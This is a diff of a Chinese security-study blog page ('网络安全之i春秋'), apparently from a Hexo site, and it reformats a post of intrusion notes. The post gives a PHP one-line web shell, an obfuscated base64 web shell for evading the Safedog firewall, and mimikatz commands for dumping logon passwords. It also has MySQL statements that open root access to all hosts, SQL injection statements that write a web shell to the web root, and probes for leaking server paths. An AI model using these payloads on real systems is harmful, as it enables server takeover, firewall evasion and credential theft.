@@ -103,7 +103,7 @@
 <meta property="og:site_name" content="王小建">
 <meta property="og:description" content="从你回南京开始，就是我们见面的倒计时啦   提权，注入，爆漏洞">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-03-20T02:40:07.017Z">
+<meta property="og:updated_time" content="2018-03-20T02:45:11.849Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="网络安全之i春秋">
 <meta name="twitter:description" content="从你回南京开始，就是我们见面的倒计时啦   提权，注入，爆漏洞">
@@ -435,7 +435,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,497
+                  1,491
                 </span>
               
 
@@ -480,9 +480,13 @@
 <h3 id="常规用户组"><a href="#常规用户组" class="headerlink" title="常规用户组"></a>常规用户组</h3><p>Administrators：本地机器拥有最高权限<br>Backup Operators:不如Administrators ,但是差不多<br>Guests:与USER权限相同<br>Distributed COM USERS:分布式系统账号，涉及域及域控制器<br>Network Conguration Operators:windows2003新增用户组，有足够权限去管理网络配置情况<br>Performance Log Users:windows2003新增用户组，这个用户有权从远程安排性能计数器的日志工作<br>Performance Monitor Users:windows2003新增用户组，有权从远程监控计算机的运行情况<br>Power Users:低于Administrators，但高于Guests,不能将添加管理员<br>Print Operators:不然Administrators,但差不多<br>Users:本地所有用户账户，低权限的用户组<br>IIS_WPG:windows2003新增用户组，安装了IIS用来运行和web应用程序的账户将被容纳该用户组</p>
 <h1 id="入侵姿势"><a href="#入侵姿势" class="headerlink" title="入侵姿势"></a>入侵姿势</h1><h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><p>一句话木马+菜刀+cmd+远控软件server.exe<br>    &lt;?php @eval($_POST[‘c’]);?&gt;</p>
 <h2 id="获取所有账户密码"><a href="#获取所有账户密码" class="headerlink" title="获取所有账户密码"></a>获取所有账户密码</h2><p>mimikatz_trunk+privilege::debug+sekurlsa::logonpasswords        </p>
-<h2 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">	&lt;?php  </span><br><span class="line">		$mt=&quot;JF9QT1N&quot;;  </span><br><span class="line">		$ojj=&quot;QGV2YWwo&quot;; </span><br><span class="line">		$hsa=&quot;UWydpMGle&quot;; </span><br><span class="line">		$fnx=&quot;5BeSleleddKTs=&quot;; </span><br><span class="line">		$zk = str_replace(&quot;d&quot;,&quot;&quot;,&quot;sdtdrd_redpdldadcde&quot;);  </span><br><span class="line">		$ef = $zk(&quot;z&quot;, &quot;&quot;, &quot;zbazsze64_zdzeczodze&quot;);  </span><br><span class="line">		$dva = $zk(&quot;p&quot;,&quot;&quot;,&quot;pcprpepaptpe_fpupnpcptpipopn&quot;);  </span><br><span class="line">		$zvm = $dva(&apos;&apos;, $ef($zk(&quot;le&quot;, &quot;&quot;, $ojj.$mt.$hsa.$fnx)));  </span><br><span class="line">		$zvm();  </span><br><span class="line">	?&gt; </span><br><span class="line">```	</span><br><span class="line">最终base64解密为@eval($_POST[&apos;i0nAy&apos;])</span><br><span class="line">## mysql提权</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO root@&quot;%&quot; IDENTIFIED BY &quot;root&quot;;		运行所有主机</span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">use mysql;															修改密码</span><br><span class="line">UPDATE user SET Password = PASSWORD(&apos;123456&apos;) WHERE user = &apos;root&apos;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"># sql注入</span><br><span class="line">一句话木马</span><br><span class="line">## 注入语句1</span><br></pre></td></tr></table></figure>
-<p>create table mysql.xiaoma (‘xiaoma1’ text not null)<br>insert into mysql.xiaoma(‘xiaoma1’) values(&lt;?php @eval($_POST[‘xiaoma’])?&gt;)<br>select xiaoma1 from xiaoma into OUTFILE ‘E:/wamp/www/7.php’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">## 注入语句2</span><br></pre></td></tr></table></figure></p>
-<p>create table xiaoma(xiaoma1 text not null)<br>insert into xiaoma (xiaoma1) values (‘&lt;?php ecal($_POST[xiaoma])?&gt;’)<br>select xiaoma1 from xiaoma into outfile ‘E:/wamp/www/7.php’<br>drop table if exist xiaoma<br>```</p>
+<h2 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">	$mt=&quot;JF9QT1N&quot;;  </span><br><span class="line">	$ojj=&quot;QGV2YWwo&quot;; </span><br><span class="line">	$hsa=&quot;UWydpMGle&quot;; </span><br><span class="line">	$fnx=&quot;5BeSleleddKTs=&quot;; </span><br><span class="line">	$zk = str_replace(&quot;d&quot;,&quot;&quot;,&quot;sdtdrd_redpdldadcde&quot;);  </span><br><span class="line">	$ef = $zk(&quot;z&quot;, &quot;&quot;, &quot;zbazsze64_zdzeczodze&quot;);  </span><br><span class="line">	$dva = $zk(&quot;p&quot;,&quot;&quot;,&quot;pcprpepaptpe_fpupnpcptpipopn&quot;);  </span><br><span class="line">	$zvm = $dva(&apos;&apos;, $ef($zk(&quot;le&quot;, &quot;&quot;, $ojj.$mt.$hsa.$fnx)));  </span><br><span class="line">	$zvm();  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>最终base64解密为@eval($_POST[‘i0nAy’])</p>
+<h2 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h2><p>GRANT ALL PRIVILEGES ON <em>.</em> TO root@”%” IDENTIFIED BY “root”;        运行所有主机<br>flush privileges;</p>
+<p>use mysql;                                                            修改密码<br>UPDATE user SET Password = PASSWORD(‘123456’) WHERE user = ‘root’;<br>FLUSH PRIVILEGES;</p>
+<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>一句话木马</p>
+<h2 id="注入语句1"><a href="#注入语句1" class="headerlink" title="注入语句1"></a>注入语句1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table mysql.xiaoma (&apos;xiaoma1&apos; text not null)</span><br><span class="line">insert into mysql.xiaoma(&apos;xiaoma1&apos;) values(&lt;?php @eval($_POST[&apos;xiaoma&apos;])?&gt;)</span><br><span class="line">select xiaoma1 from xiaoma into OUTFILE &apos;E:/wamp/www/7.php&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="注入语句2"><a href="#注入语句2" class="headerlink" title="注入语句2"></a>注入语句2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table xiaoma(xiaoma1 text not null)</span><br><span class="line">insert into xiaoma (xiaoma1) values (&apos;&lt;?php ecal($_POST[xiaoma])?&gt;&apos;)</span><br><span class="line">select xiaoma1 from xiaoma into outfile &apos;E:/wamp/www/7.php&apos;</span><br><span class="line">drop table if exist xiaoma</span><br></pre></td></tr></table></figure>
 <h1 id="爆路径"><a href="#爆路径" class="headerlink" title="爆路径"></a>爆路径</h1><p>www.xxx.com/news.php?id=12’     添加引号 服务器返回错误信息<br>www.xxx.com/res.php?id=1        将要提交的参数值改成错误值<br>site:xxx.edu.tw warning<br>site:xxx.edu.tw “fatal error”<br>www.xxx.com/test.php<br>www.xxx.com/ceshi.php<br>www.xxx.com/info.php<br>www.xxx.com/phpinfo.php<br>www.xxx.com/1.php<br>system vi /etc/httpd/conf/httpd.conf</p>
 <h1 id="非法文件上传漏洞技术解析及防御"><a href="#非法文件上传漏洞技术解析及防御" class="headerlink" title="非法文件上传漏洞技术解析及防御"></a>非法文件上传漏洞技术解析及防御</h1><blockquote>
 <p>网站前端对上传文件类型限制，可以F12修改点击触发事件，还可以修改事件中添加php，用来添加一句话php后门，后用菜刀连接<br>    &lt;?php @eval($_POST[‘c’]);?&gt;</p>
@@ -743,7 +747,7 @@ var jiathis_config={
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -754,7 +758,7 @@ var jiathis_config={
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -765,7 +769,7 @@ var jiathis_config={
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-count">41</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -828,7 +832,7 @@ var jiathis_config={
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#入侵的艺术—高级篇"><span class="nav-number">1.</span> <span class="nav-text">入侵的艺术—高级篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#windows-权限分析和密码安全测试"><span class="nav-number">1.1.</span> <span class="nav-text">windows 权限分析和密码安全测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常规用户"><span class="nav-number">1.1.1.</span> <span class="nav-text">常规用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常规用户组"><span class="nav-number">1.1.2.</span> <span class="nav-text">常规用户组</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#入侵姿势"><span class="nav-number">2.</span> <span class="nav-text">入侵姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#远程控制"><span class="nav-number">2.1.</span> <span class="nav-text">远程控制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取所有账户密码"><span class="nav-number">2.2.</span> <span class="nav-text">获取所有账户密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过安全狗"><span class="nav-number">2.3.</span> <span class="nav-text">过安全狗</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#爆路径"><span class="nav-number">3.</span> <span class="nav-text">爆路径</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#非法文件上传漏洞技术解析及防御"><span class="nav-number">4.</span> <span class="nav-text">非法文件上传漏洞技术解析及防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">5.</span> <span class="nav-text">漏洞挖掘</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#入侵的艺术—高级篇"><span class="nav-number">1.</span> <span class="nav-text">入侵的艺术—高级篇</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#windows-权限分析和密码安全测试"><span class="nav-number">1.1.</span> <span class="nav-text">windows 权限分析和密码安全测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常规用户"><span class="nav-number">1.1.1.</span> <span class="nav-text">常规用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常规用户组"><span class="nav-number">1.1.2.</span> <span class="nav-text">常规用户组</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#入侵姿势"><span class="nav-number">2.</span> <span class="nav-text">入侵姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#远程控制"><span class="nav-number">2.1.</span> <span class="nav-text">远程控制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取所有账户密码"><span class="nav-number">2.2.</span> <span class="nav-text">获取所有账户密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过安全狗"><span class="nav-number">2.3.</span> <span class="nav-text">过安全狗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql提权"><span class="nav-number">2.4.</span> <span class="nav-text">mysql提权</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql注入"><span class="nav-number">3.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注入语句1"><span class="nav-number">3.1.</span> <span class="nav-text">注入语句1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入语句2"><span class="nav-number">3.2.</span> <span class="nav-text">注入语句2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#爆路径"><span class="nav-number">4.</span> <span class="nav-text">爆路径</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#非法文件上传漏洞技术解析及防御"><span class="nav-number">5.</span> <span class="nav-text">非法文件上传漏洞技术解析及防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">6.</span> <span class="nav-text">漏洞挖掘</span></a></li></ol></div>
             
 
           </div>
@@ -856,7 +860,7 @@ var jiathis_config={
   <span class="author" itemprop="copyrightHolder">AsherCode</span>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共87.0k字</span>
+  <span class="post-count">博客全站共101.6k字</span>
 </div>
   
 </div>
